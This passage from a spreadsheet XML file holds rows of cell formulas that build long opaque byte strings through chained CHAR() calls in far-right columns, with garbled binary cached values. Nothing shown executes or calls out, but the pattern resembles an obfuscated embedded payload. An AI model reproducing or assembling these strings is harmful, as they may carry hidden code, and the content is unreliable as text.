amp;CHAR(34)&amp;CHAR(51)&amp;CHAR(236)&amp;CHAR(114)&amp;CHAR(46)&amp;CHAR(251)&amp;CHAR(117)&amp;CHAR(34)&amp;CHAR(242)&amp;CHAR(113)&amp;CHAR(75)&amp;CHAR(252)&amp;CHAR(124)&amp;CHAR(65)&amp;CHAR(85)&amp;CHAR(254)&amp;CHAR(221)&amp;CHAR(30)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(240)&amp;CHAR(123)&amp;CHAR(32)&amp;CHAR(134)&amp;CHAR(251)&amp;CHAR(245)&amp;CHAR(121)&amp;CHAR(44)&amp;CHAR(249)&amp;CHAR(86)&amp;CHAR(86)&amp;CHAR(254)&amp;CHAR(100)&amp;CHAR(90)&amp;CHAR(80)&amp;CHAR(226)&amp;CHAR(184)&amp;CHAR(17)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(130)&amp;CHAR(198)&amp;CHAR(45)&amp;CHAR(141)&amp;CHAR(209)&amp;CHAR(142)&amp;CHAR(89)&amp;CHAR(53)&amp;CHAR(51)&amp;CHAR(132)&amp;CHAR(244)&amp;CHAR(4)&amp;CHAR(129)&amp;CHAR(23)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(130)&amp;CHAR(209)&amp;CHAR(10)&amp;CHAR(129)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(109)&amp;CHAR(23)&amp;CHAR(109)&amp;CHAR(2)&amp;CHAR(52)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(242)&amp;CHAR(49)&amp;CHAR(109)&amp;CHAR(3)&amp;CHAR(244)&amp;CHAR(223)&amp;CHAR(137)&amp;CHAR(230)&amp;CHAR(137)&amp;CHAR(242)&amp;CHAR(13)&amp;CHAR(130)&amp;CHAR(249)&amp;CHAR(13)&amp;CHAR(12)&amp;CHAR(13)&amp;CHAR(244)&amp;CHAR(61)&amp;CHAR(89)&amp;CHAR(82)&amp;CHAR(238)&amp;CHAR(54)&amp;CHAR(31)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(96)&amp;CHAR(39)&amp;CHAR(135)&amp;CHAR(65)&amp;CHAR(47)&amp;CHAR(37)&amp;CHAR(99)&amp;CHAR(1)&amp;CHAR(82)&amp;CHAR(237)&amp;CHAR(43)&amp;CHAR(20)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(154)&amp;CHAR(1)&amp;CHAR(140)&amp;CHAR(172)&amp;CHAR(59)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(42)&amp;CHAR(35)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(85)&amp;CHAR(82)&amp;CHAR(132)&amp;CHAR(67)&amp;CHAR(18)&amp;CHAR(87)&amp;CHAR(158)&amp;CHAR(67)&amp;CHAR(6)&amp;CHAR(84)&amp;CHAR(234)&amp;CHAR(230)&amp;CHAR(22)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(252)&amp;CHAR(125)&amp;CHAR(37)&amp;CHAR(143)&amp;CHAR(144)&amp;CHAR(20)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(240)&amp;CHAR(122)&amp;CHAR(36)&amp;CHAR(93)&amp;CHAR(227)&amp;CHAR(191)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(162)&amp;CHAR(198)&amp;CHAR(53)&amp;CHAR(40)&amp;CHAR(140)&amp;CHAR(31)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(140)&amp;CHAR(78)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(50)&amp;CHAR(145)&amp;CHAR(25)&amp;CHAR(22)&amp;CHAR(7)&amp;CHAR(1)</f>
        <v>˜H_x0011_é™V_x000C_Œ_x0007_=ËóÞ‡ŒõÅ’vãã_x0013_Ëu›nOiJ|šš*{³_x0004_GÏÂ3¾__x0011_‹ß^©™_x0004_6_x0017_¯Ÿ[u&lt;?qÀ¨…ƒR_SW„ÿ'YPSP‚y"3ìr.ûu"òqKü|AUþÝ_x001E__x0002__x0006_ð{ †ûõy,ùVVþdZPâ¸_x0011__x0005_	‚Æ-ÑŽY53„ô_x0004__x0017__x0007__x0007__x0013_‚Ñ

_x000B__x0005__x0006_m_x0017_m_x0002_4_x0002_
ò1m_x0003_ôß‰æ‰ò_x000D_‚ù_x000D__x000C__x000D_ô=YRî6_x001F__x0001__x0013_`'‡A/%c_x0001_Rí+_x0014__x0007__x0005_š_x0001_Œ¬;_x0007__x0002__x0005_*#_x0005_
_x0005_UR„C_x0012_WžC_x0006_Têæ_x0016__x0006__x0007_ü}%_x0014__x0002__x0002__x0006_ðz$]ã¿_x0014__x0004__x0006_¢Æ5(Œ_x001F__x000D__x0005__x000B_
ŒN_x0003__x0005__x0006_2‘_x0019__x0016__x0007__x0001_</v>
      </c>
      <c r="DG73" t="str">
        <f>CHAR(192)&amp;CHAR(195)&amp;CHAR(204)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(85)&amp;CHAR(223)&amp;CHAR(218)&amp;CHAR(34)&amp;CHAR(131)</f>
        <v>ÀÃÌ|ŸUßÚ"ƒ</v>
      </c>
      <c r="DH73" t="s">
        <v>62</v>
      </c>
    </row>
    <row r="74" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF74" t="str">
        <f>CHAR(13)&amp;CHAR(142)&amp;CHAR(70)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(236)&amp;CHAR(113)&amp;CHAR(38)&amp;CHAR(250)&amp;CHAR(115)&amp;CHAR(47)&amp;CHAR(246)&amp;CHAR(115)&amp;CHAR(50)&amp;CHAR(248)&amp;CHAR(101)&amp;CHAR(53)&amp;CHAR(84)&amp;CHAR(236)&amp;CHAR(25)&amp;CHAR(16)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(132)&amp;CHAR(199)&amp;CHAR(31)&amp;CHAR(128)&amp;CHAR(68)&amp;CHAR(38)&amp;CHAR(137)&amp;CHAR(196)&amp;CHAR(13)&amp;CHAR(130)&amp;CHAR(121)&amp;CHAR(13)&amp;CHAR(12)&amp;CHAR(13)&amp;CHAR(56)&amp;CHAR(245)&amp;CHAR(55)&amp;CHAR(186)&amp;CHAR(50)&amp;CHAR(35)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(101)&amp;CHAR(28)&amp;CHAR(138)&amp;CHAR(148)&amp;CHAR(61)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(82)&amp;CHAR(253)&amp;CHAR(83)&amp;CHAR(54)&amp;CHAR(78)&amp;CHAR(132)&amp;CHAR(198)&amp;CHAR(49)&amp;CHAR(60)&amp;CHAR(191)&amp;CHAR(54)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(119)&amp;CHAR(247)&amp;CHAR(32)&amp;CHAR(220)&amp;CHAR(73)&amp;CHAR(60)&amp;CHAR(88)&amp;CHAR(7)&amp;CHAR(127)&amp;CHAR(49)&amp;CHAR(139)&amp;CHAR(105)&amp;CHAR(39)&amp;CHAR(136)&amp;CHAR(124)&amp;CHAR(60)&amp;CHAR(253)&amp;CHAR(124)&amp;CHAR(33)&amp;CHAR(249)&amp;CHAR(113)&amp;CHAR(43)&amp;CHAR(244)&amp;CHAR(126)&amp;CHAR(6)&amp;CHAR(233)&amp;CHAR(59)&amp;CHAR(82)&amp;CHAR(234)&amp;CHAR(200)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(12)&amp;CHAR(142)&amp;CHAR(207)&amp;CHAR(30)&amp;CHAR(135)&amp;CHAR(65)&amp;CHAR(6)&amp;CHAR(164)&amp;CHAR(194)&amp;CHAR(14)&amp;CHAR(151)&amp;CHAR(216)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(72)&amp;CHAR(134)&amp;CHAR(206)&amp;CHAR(9)&amp;CHAR(129)&amp;CHAR(192)&amp;CHAR(2)&amp;CHAR(50)&amp;CHAR(153)&amp;CHAR(53)&amp;CHAR(19)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(112)&amp;CHAR(217)&amp;CHAR(142)&amp;CHAR(132)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(19)&amp;CHAR(7)&amp;CHAR(96)&amp;CHAR(7)&amp;CHAR(94)&amp;CHAR(60)&amp;CHAR(202)&amp;CHAR(112)&amp;CHAR(19)&amp;CHAR(81)&amp;CHAR(251)&amp;CHAR(44)&amp;CHAR(7)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(83)&amp;CHAR(136)&amp;CHAR(198)&amp;CHAR(8)&amp;CHAR(135)&amp;CHAR(172)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(22)&amp;CHAR(135)&amp;CHAR(130)&amp;CHAR(14)&amp;CHAR(3)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(129)&amp;CHAR(179)&amp;CHAR(67)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(4)&amp;CHAR(133)&amp;CHAR(217)&amp;CHAR(3)&amp;CHAR(117)&amp;CHAR(17)&amp;CHAR(129)&amp;CHAR(56)&amp;CHAR(137)&amp;CHAR(187)&amp;CHAR(75)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(3)&amp;CHAR(113)&amp;CHAR(32)&amp;CHAR(95)&amp;CHAR(239)&amp;CHAR(55)&amp;CHAR(18)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(91)&amp;CHAR(142)&amp;CHAR(197)&amp;CHAR(119)&amp;CHAR(13)&amp;CHAR(62)&amp;CHAR(141)&amp;CHAR(71)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(115)&amp;CHAR(113)&amp;CHAR(83)&amp;CHAR(238)&amp;CHAR(2)&amp;CHAR(23)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(93)&amp;CHAR(135)&amp;CHAR(202)&amp;CHAR(120)&amp;CHAR(14)&amp;CHAR(62)&amp;CHAR(157)&amp;CHAR(75)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(22)&amp;CHAR(120)&amp;CHAR(97)&amp;CHAR(129)&amp;CHAR(57)&amp;CHAR(12)&amp;CHAR(120)&amp;CHAR(85)&amp;CHAR(142)&amp;CHAR(52)&amp;CHAR(14)&amp;CHAR(122)&amp;CHAR(80)&amp;CHAR(133)&amp;CHAR(30)&amp;CHAR(3)&amp;CHAR(117)&amp;CHAR(48)&amp;CHAR(51)&amp;CHAR(24)&amp;CHAR(126)&amp;CHAR(26)&amp;CHAR(136)&amp;CHAR(58)&amp;CHAR(12)&amp;CHAR(117)&amp;CHAR(16)&amp;CHAR(134)&amp;CHAR(57)&amp;CHAR(15)&amp;CHAR(115)&amp;CHAR(8)&amp;CHAR(146)&amp;CHAR(56)</f>
        <v>_x000D_ŽF_x0003__x0005__x0007_ìq&amp;ús/ös2øe5Tì_x0019__x0010__x000D__x0006_„Ç_x001F_€D&amp;‰Ä_x000D_‚y_x000D__x000C__x000D_8õ7º2#_x0002__x0001_e_x001C_Š”=	_x0005_	RýS6N„Æ1&lt;¿6	_x0005__x0002_w÷ ÜI&lt;X_x0007_1‹i'ˆ|&lt;ý|!ùq+ô~_x0006_é;RêÈ_x0016__x000C__x000C_ŽÏ_x001E_‡A_x0006_¤Â_x000E_—Ø_x0007_
_x0005_H†Î	À_x0002_2™5_x0013__x0007__x0001_pÙŽ„	_x0002__x0013__x0007_`_x0007_^&lt;Êp_x0013_Qû,_x0007__x0004__x0002_SˆÆ_x0008_‡¬	_x0002__x0016_‡‚_x000E__x0003__x000F__x000C_³C_x000D__x000E__x0004_…Ù_x0003_u_x0011_8‰»K_x0006_	_x0001__x0003_q _ï7_x0012__x0007__x0001_[ŽÅw_x000D_&gt;G	_x0005__x0005_sqSî_x0002__x0017__x0005__x0002_]‡Êx_x000E_&gt;K
_x0002__x0016_xa9_x000C_xUŽ4_x000E_zP…_x001E__x0003_u03_x0018_~_x001A_ˆ:_x000C_u_x0010_†9_x000F_s_x0008_’8</v>
      </c>
      <c r="DG74" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(119)&amp;CHAR(78)&amp;CHAR(175)&amp;CHAR(40)&amp;CHAR(42)&amp;CHAR(227)&amp;CHAR(130)&amp;CHAR(247)</f>
        <v>Ê|wN¯(*ã‚÷</v>
      </c>
      <c r="DH74" t="s">
        <v>63</v>
      </c>
    </row>
    <row r="75" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF75" t="str">
        <f>CHAR(6)&amp;CHAR(119)&amp;CHAR(72)&amp;CHAR(83)&amp;CHAR(234)&amp;CHAR(224)&amp;CHAR(16)&amp;CHAR(19)&amp;CHAR(7)&amp;CHAR(225)&amp;CHAR(63)&amp;CHAR(83)&amp;CHAR(239)&amp;CHAR(69)&amp;CHAR(19)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(248)&amp;CHAR(55)&amp;CHAR(143)&amp;CHAR(64)&amp;CHAR(38)&amp;CHAR(26)&amp;CHAR(93)&amp;CHAR(80)&amp;CHAR(239)&amp;CHAR(228)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(79)&amp;CHAR(85)&amp;CHAR(129)&amp;CHAR(194)&amp;CHAR(114)&amp;CHAR(2)&amp;CHAR(129)&amp;CHAR(72)&amp;CHAR(41)&amp;CHAR(27)&amp;CHAR(90)&amp;CHAR(88)&amp;CHAR(236)&amp;CHAR(231)&amp;CHAR(47)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(74)&amp;CHAR(83)&amp;CHAR(138)&amp;CHAR(78)&amp;CHAR(33)&amp;CHAR(27)&amp;CHAR(85)&amp;CHAR(95)&amp;CHAR(233)&amp;CHAR(95)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(94)&amp;CHAR(238)&amp;CHAR(23)&amp;CHAR(81)&amp;CHAR(233)&amp;CHAR(147)&amp;CHAR(26)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(92)&amp;CHAR(140)&amp;CHAR(79)&amp;CHAR(35)&amp;CHAR(62)&amp;CHAR(134)&amp;CHAR(187)&amp;CHAR(11)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(172)&amp;CHAR(5)&amp;CHAR(194)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(127)&amp;CHAR(35)&amp;CHAR(141)&amp;CHAR(129)&amp;CHAR(75)&amp;CHAR(12)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(147)&amp;CHAR(204)&amp;CHAR(112)&amp;CHAR(38)&amp;CHAR(249)&amp;CHAR(185)&amp;CHAR(76)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(96)&amp;CHAR(14)&amp;CHAR(84)&amp;CHAR(238)&amp;CHAR(90)&amp;CHAR(25)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(137)&amp;CHAR(195)&amp;CHAR(6)&amp;CHAR(82)&amp;CHAR(97)&amp;CHAR(5)&amp;CHAR(246)&amp;CHAR(183)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(248)&amp;CHAR(83)&amp;CHAR(81)&amp;CHAR(132)&amp;CHAR(167)&amp;CHAR(74)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(248)&amp;CHAR(37)&amp;CHAR(109)&amp;CHAR(10)&amp;CHAR(83)&amp;CHAR(237)&amp;CHAR(92)&amp;CHAR(18)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(132)&amp;CHAR(215)&amp;CHAR(9)&amp;CHAR(85)&amp;CHAR(110)&amp;CHAR(2)&amp;CHAR(92)&amp;CHAR(242)&amp;CHAR(213)&amp;CHAR(52)&amp;CHAR(195)&amp;CHAR(224)&amp;CHAR(10)&amp;CHAR(129)&amp;CHAR(222)&amp;CHAR(243)&amp;CHAR(91)&amp;CHAR(92)&amp;CHAR(91)&amp;CHAR(84)&amp;CHAR(143)&amp;CHAR(200)&amp;CHAR(45)&amp;CHAR(200)&amp;CHAR(129)&amp;CHAR(74)&amp;CHAR(32)&amp;CHAR(2)&amp;CHAR(162)&amp;CHAR(194)&amp;CHAR(5)&amp;CHAR(227)&amp;CHAR(245)&amp;CHAR(7)&amp;CHAR(129)&amp;CHAR(5)&amp;CHAR(201)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(50)&amp;CHAR(194)&amp;CHAR(199)&amp;CHAR(14)&amp;CHAR(9)&amp;CHAR(82)&amp;CHAR(142)&amp;CHAR(253)&amp;CHAR(241)&amp;CHAR(68)&amp;CHAR(18)&amp;CHAR(9)&amp;CHAR(83)&amp;CHAR(137)&amp;CHAR(112)&amp;CHAR(15)&amp;CHAR(68)&amp;CHAR(115)&amp;CHAR(31)&amp;CHAR(142)&amp;CHAR(120)&amp;CHAR(31)&amp;CHAR(140)&amp;CHAR(250)&amp;CHAR(114)&amp;CHAR(28)&amp;CHAR(152)&amp;CHAR(67)&amp;CHAR(22)&amp;CHAR(84)&amp;CHAR(137)&amp;CHAR(2)&amp;CHAR(242)&amp;CHAR(87)&amp;CHAR(3)&amp;CHAR(136)&amp;CHAR(77)&amp;CHAR(29)&amp;CHAR(139)&amp;CHAR(17)&amp;CHAR(250)&amp;CHAR(65)&amp;CHAR(18)&amp;CHAR(7)&amp;CHAR(123)&amp;CHAR(21)&amp;CHAR(135)&amp;CHAR(112)&amp;CHAR(31)&amp;CHAR(143)&amp;CHAR(241)&amp;CHAR(113)&amp;CHAR(1)&amp;CHAR(153)&amp;CHAR(1)&amp;CHAR(65)&amp;CHAR(19)&amp;CHAR(138)&amp;CHAR(236)&amp;CHAR(7)&amp;CHAR(134)&amp;CHAR(205)&amp;CHAR(9)&amp;CHAR(95)&amp;CHAR(138)&amp;CHAR(4)&amp;CHAR(250)&amp;CHAR(86)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(50)&amp;CHAR(34)</f>
        <v>_x0006_wHSêà_x0010__x0013__x0007_á?SïE_x0013__x0006__x0007_ø7@&amp;_x001A_]Pïä_x0007_	_x0002_OUÂr_x0002_H)_x001B_ZXìç/_x0002__x0001_JSŠN!_x001B_U_é__x000D__x0006_	^î_x0017_Qé“_x001A__x0005__x0002_\ŒO#&gt;†»_x000B__x000C__x0005__x0006__x0005_¬_x0005_Â_x0004__x0002_#K_x000C_	_x0002_“Ìp&amp;ù¹L_x000B__x000D__x000B_`_x000E_TîZ_x0019__x0001__x0013_‰Ã_x0006_Ra_x0005_ö·J_x0002__x0006_	øSQ„§J_x000C__x0005__x0002__x0005_ø%m
Sí\_x0012__x0005__x0006_„×	Un_x0002_\òÕ4Ãà
Þó[\[TÈ-ÈJ _x0002_¢Â_x0005_ãõ_x0007__x0005_É_x0001_	2ÂÇ_x000E_	RŽýñD_x0012_	S‰p_x000F_Ds_x001F_Žx_x001F_Œúr_x001C_˜C_x0016_T‰_x0002_òW_x0003_ˆM_x001D_‹_x0011_úA_x0012__x0007_{_x0015_‡p_x001F_ñq_x0001_™_x0001_A_x0013_Šì_x0007_†Í	_Š_x0004_úV_x000D_Ž2"</v>
      </c>
      <c r="DG75" t="str">
        <f>CHAR(171)&amp;CHAR(56)&amp;CHAR(122)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(255)&amp;CHAR(89)&amp;CHAR(85)</f>
        <v>«8z×Õ†‚ÿYU</v>
      </c>
      <c r="DH75" t="s">
        <v>64</v>
      </c>
    </row>
    <row r="76" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF76" t="str">
        <f>CHAR(199)&amp;CHAR(94)&amp;CHAR(92)&amp;CHAR(86)&amp;CHAR(199)&amp;CHAR(22)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(87)&amp;CHAR(35)&amp;CHAR(14)&amp;CHAR(142)&amp;CHAR(69)&amp;CHAR(47)&amp;CHAR(246)&amp;CHAR(85)&amp;CHAR(82)&amp;CHAR(140)&amp;CHAR(95)&amp;CHAR(33)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(3)&amp;CHAR(57)&amp;CHAR(205)&amp;CHAR(196)&amp;CHAR(15)&amp;CHAR(3)&amp;CHAR(93)&amp;CHAR(94)&amp;CHAR(234)&amp;CHAR(30)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(141)&amp;CHAR(123)&amp;CHAR(40)&amp;CHAR(28)&amp;CHAR(180)&amp;CHAR(24)&amp;CHAR(30)&amp;CHAR(78)&amp;CHAR(4)&amp;CHAR(185)&amp;CHAR(197)&amp;CHAR(40)&amp;CHAR(65)&amp;CHAR(19)&amp;CHAR(33)&amp;CHAR(200)&amp;CHAR(9)&amp;CHAR(205)&amp;CHAR(128)&amp;CHAR(3)&amp;CHAR(128)&amp;CHAR(9)&amp;CHAR(234)&amp;CHAR(232)&amp;CHAR(17)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(188)&amp;CHAR(115)&amp;CHAR(21)&amp;CHAR(65)&amp;CHAR(2)&amp;CHAR(32)&amp;CHAR(202)&amp;CHAR(1)&amp;CHAR(205)&amp;CHAR(140)&amp;CHAR(21)&amp;CHAR(142)&amp;CHAR(66)&amp;CHAR(1)&amp;CHAR(237)&amp;CHAR(221)&amp;CHAR(30)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(190)&amp;CHAR(97)&amp;CHAR(17)&amp;CHAR(66)&amp;CHAR(4)&amp;CHAR(41)&amp;CHAR(197)&amp;CHAR(14)&amp;CHAR(206)&amp;CHAR(140)&amp;CHAR(5)&amp;CHAR(130)&amp;CHAR(65)&amp;CHAR(10)&amp;CHAR(254)&amp;CHAR(203)&amp;CHAR(19)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(182)&amp;CHAR(204)&amp;CHAR(30)&amp;CHAR(77)&amp;CHAR(11)&amp;CHAR(33)&amp;CHAR(193)&amp;CHAR(7)&amp;CHAR(206)&amp;CHAR(170)&amp;CHAR(4)&amp;CHAR(136)&amp;CHAR(91)&amp;CHAR(6)&amp;CHAR(239)&amp;CHAR(190)&amp;CHAR(18)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(176)&amp;CHAR(119)&amp;CHAR(16)&amp;CHAR(69)&amp;CHAR(6)&amp;CHAR(34)&amp;CHAR(200)&amp;CHAR(6)&amp;CHAR(217)&amp;CHAR(140)&amp;CHAR(7)&amp;CHAR(139)&amp;CHAR(67)&amp;CHAR(21)&amp;CHAR(234)&amp;CHAR(164)&amp;CHAR(16)&amp;CHAR(19)&amp;CHAR(7)&amp;CHAR(179)&amp;CHAR(116)&amp;CHAR(23)&amp;CHAR(71)&amp;CHAR(9)&amp;CHAR(46)&amp;CHAR(201)&amp;CHAR(4)&amp;CHAR(219)&amp;CHAR(142)&amp;CHAR(4)&amp;CHAR(141)&amp;CHAR(74)&amp;CHAR(30)&amp;CHAR(229)&amp;CHAR(136)&amp;CHAR(16)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(176)&amp;CHAR(12)&amp;CHAR(2)&amp;CHAR(76)&amp;CHAR(4)&amp;CHAR(41)&amp;CHAR(201)&amp;CHAR(12)&amp;CHAR(196)&amp;CHAR(135)&amp;CHAR(11)&amp;CHAR(130)&amp;CHAR(66)&amp;CHAR(22)&amp;CHAR(236)&amp;CHAR(125)&amp;CHAR(54)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(170)&amp;CHAR(123)&amp;CHAR(21)&amp;CHAR(74)&amp;CHAR(5)&amp;CHAR(32)&amp;CHAR(202)&amp;CHAR(10)&amp;CHAR(201)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(27)&amp;CHAR(237)&amp;CHAR(121)&amp;CHAR(16)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(178)&amp;CHAR(198)&amp;CHAR(17)&amp;CHAR(69)&amp;CHAR(7)&amp;CHAR(56)&amp;CHAR(200)&amp;CHAR(9)&amp;CHAR(205)&amp;CHAR(142)&amp;CHAR(1)&amp;CHAR(128)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(239)&amp;CHAR(70)&amp;CHAR(18)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(187)&amp;CHAR(180)&amp;CHAR(30)&amp;CHAR(70)&amp;CHAR(7)&amp;CHAR(40)&amp;CHAR(196)&amp;CHAR(10)&amp;CHAR(202)&amp;CHAR(157)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(74)&amp;CHAR(34)&amp;CHAR(231)&amp;CHAR(78)&amp;CHAR(27)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(179)&amp;CHAR(176)&amp;CHAR(23)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(41)&amp;CHAR(206)&amp;CHAR(16)&amp;CHAR(194)&amp;CHAR(140)&amp;CHAR(12)&amp;CHAR(90)&amp;CHAR(130)&amp;CHAR(77)&amp;CHAR(33)&amp;CHAR(138)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(14)&amp;CHAR(138)&amp;CHAR(97)&amp;CHAR(1)</f>
        <v>Ç^\VÇ_x0016__x0005_ŒW#_x000E_ŽE/öURŒ_!
_x0003_9ÍÄ_x000F__x0003_]^ê_x001E__x0014__x0004__x0002_{(_x001C_´_x0018__x001E_N_x0004_¹Å(A_x0013_!È	Í€_x0003_€	êè_x0011_	_x0007_¼s_x0015_A_x0002_ Ê_x0001_ÍŒ_x0015_ŽB_x0001_íÝ_x001E__x0005__x0006_¾a_x0011_B_x0004_)Å_x000E_ÎŒ_x0005_‚A
þË_x0013__x0002__x0006_¶Ì_x001E_M_x000B_!Á_x0007_Îª_x0004_ˆ[_x0006_ï¾_x0012__x000B__x0005_°w_x0010_E_x0006_"È_x0006_ÙŒ_x0007_‹C_x0015_ê¤_x0010__x0013__x0007_³t_x0017_G	.É_x0004_ÛŽ_x0004_J_x001E_åˆ_x0010__x0003__x000B_°_x000C__x0002_L_x0004_)É_x000C_Ä‡_x000B_‚B_x0016_ì}6_x0002__x0001_ª{_x0015_J_x0005_ Ê
É‰_x0003_A_x001B_íy_x0010__x0001__x0002_²Æ_x0011_E_x0007_8È	ÍŽ_x0001_€M&amp;ïF_x0012__x0002__x0004_»´_x001E_F_x0007_(Ä
Ê
J"çN_x001B__x000D__x000B_³°_x0017_F!)Î_x0010_ÂŒ_x000C_Z‚M!ŠF!_x000E_Ša_x0001_</v>
      </c>
      <c r="DG76" t="str">
        <f>CHAR(27)&amp;CHAR(94)&amp;CHAR(37)&amp;CHAR(206)&amp;CHAR(71)&amp;CHAR(105)&amp;CHAR(193)&amp;CHAR(27)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>_x001B_^%ÎGiÁ_x001B_R×</v>
      </c>
      <c r="DH76" t="s">
        <v>65</v>
      </c>
    </row>
    <row r="77" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF77" t="str">
        <f>CHAR(17)&amp;CHAR(142)&amp;CHAR(71)&amp;CHAR(42)&amp;CHAR(85)&amp;CHAR(198)&amp;CHAR(49)&amp;CHAR(197)&amp;CHAR(197)&amp;CHAR(23)&amp;CHAR(7)&amp;CHAR(95)&amp;CHAR(142)&amp;CHAR(233)&amp;CHAR(132)&amp;CHAR(229)&amp;CHAR(41)&amp;CHAR(53)&amp;CHAR(199)&amp;CHAR(69)&amp;CHAR(111)&amp;CHAR(34)&amp;CHAR(84)&amp;CHAR(139)&amp;CHAR(79)&amp;CHAR(249)&amp;CHAR(143)&amp;CHAR(66)&amp;CHAR(251)&amp;CHAR(130)&amp;CHAR(76)&amp;CHAR(254)&amp;CHAR(155)&amp;CHAR(73)&amp;CHAR(208)&amp;CHAR(82)&amp;CHAR(238)&amp;CHAR(203)&amp;CHAR(21)&amp;CHAR(12)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(127)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(75)&amp;CHAR(245)&amp;CHAR(129)&amp;CHAR(197)&amp;CHAR(31)&amp;CHAR(129)&amp;CHAR(1)&amp;CHAR(91)&amp;CHAR(83)&amp;CHAR(244)&amp;CHAR(85)&amp;CHAR(5)&amp;CHAR(132)&amp;CHAR(194)&amp;CHAR(112)&amp;CHAR(20)&amp;CHAR(130)&amp;CHAR(1)&amp;CHAR(136)&amp;CHAR(92)&amp;CHAR(251)&amp;CHAR(80)&amp;CHAR(143)&amp;CHAR(70)&amp;CHAR(253)&amp;CHAR(83)&amp;CHAR(136)&amp;CHAR(74)&amp;CHAR(231)&amp;CHAR(86)&amp;CHAR(92)&amp;CHAR(250)&amp;CHAR(85)&amp;CHAR(23)&amp;CHAR(58)&amp;CHAR(197)&amp;CHAR(88)&amp;CHAR(206)&amp;CHAR(209)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(55)&amp;CHAR(194)&amp;CHAR(200)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(140)&amp;CHAR(79)&amp;CHAR(47)&amp;CHAR(5)&amp;CHAR(135)&amp;CHAR(223)&amp;CHAR(121)&amp;CHAR(3)&amp;CHAR(186)&amp;CHAR(5)&amp;CHAR(79)&amp;CHAR(12)&amp;CHAR(140)&amp;CHAR(230)&amp;CHAR(70)&amp;CHAR(89)&amp;CHAR(13